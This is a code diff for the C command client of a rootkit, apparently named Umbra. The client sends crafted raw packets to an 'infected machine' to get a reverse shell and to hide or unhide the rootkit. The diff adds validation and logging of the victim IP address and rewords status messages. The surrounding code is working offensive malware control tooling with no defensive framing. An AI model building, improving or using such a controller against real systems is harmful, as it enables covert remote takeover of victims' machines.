@@ -45,6 +45,16 @@ void print_help_dialog(const char* arg){
 
 }
 
+void check_ip_address_format(char* address){
+    char* buf[256];
+    int s = inet_pton(AF_INET, address, buf);
+    if(s<0){
+        printf("["KYLW"WARN"RESET"]""Error checking IP validity\n");
+    }else if(s==0){
+        printf("["KYLW"WARN"RESET"]""The victim IP is probably not valid\n");
+    }
+}
+
 char* getLocalIpAddress(){
     char hostbuffer[256];
     char* IPbuffer = calloc(256, sizeof(char));
@@ -75,6 +85,8 @@ char* getLocalIpAddress(){
 
 void get_shell(char* argv){
     char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    check_ip_address_format(argv);
     packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_PAYLOAD_GET_REVERSE_SHELL");
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
 
@@ -114,26 +126,30 @@ void get_shell(char* argv){
 
 void show_rootkit(char* argv){
     char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    check_ip_address_format(argv);
     packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_SHOW_ROOTKIT");
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
     //Sending the malicious payload
     if(rawsocket_send(packet)<0){
         printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
     }else{
-        printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
+        printf("["KGRN"OK"RESET"]""Request to unhide successfully sent!\n");
     }
     free(local_ip);
 }
 
 void hide_rootkit(char* argv){
     char* local_ip = getLocalIpAddress();
+    printf("["KBLU"INFO"RESET"]""Victim IP selected: %s\n", argv);
+    check_ip_address_format(argv);
     packet_t packet = build_standard_packet(9000, 9000, local_ip, argv, 2048, "UMBRA_HIDE_ROOTKIT");
     printf("["KBLU"INFO"RESET"]""Sending malicious packet to infected machine...\n");
     //Sending the malicious payload
     if(rawsocket_send(packet)<0){
         printf("["KRED"ERROR"RESET"]""An error occured. Is the machine up?\n");
     }else{
-        printf("["KGRN"OK"RESET"]""Payload successfully sent!\n");
+        printf("["KGRN"OK"RESET"]""Request to hide successfully sent!\n");
     }
     free(local_ip);
 }
